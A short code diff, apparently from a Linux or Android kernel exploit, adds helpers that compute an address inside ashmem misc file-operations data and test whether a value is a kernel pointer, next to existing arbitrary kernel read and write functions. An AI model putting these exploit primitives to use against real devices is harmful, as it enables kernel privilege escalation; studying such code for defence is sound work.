@@ -1016,3 +1016,12 @@ ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
   return configfs_read_once(fd, target, data, len);
 }
+
+uintptr_t misc_fops_data_addr(void) {
+  return p0_data_alias(ASHMEM_MISC_FOPS) +
+         (ASHMEM_MISC_FOPS_FIELD_OFF - ASHMEM_MISC_FOPS_OFF);
+}
+
+int is_kernel_ptr(uintptr_t value) {
+  return value >= 0xffff800000000000ULL;
+}
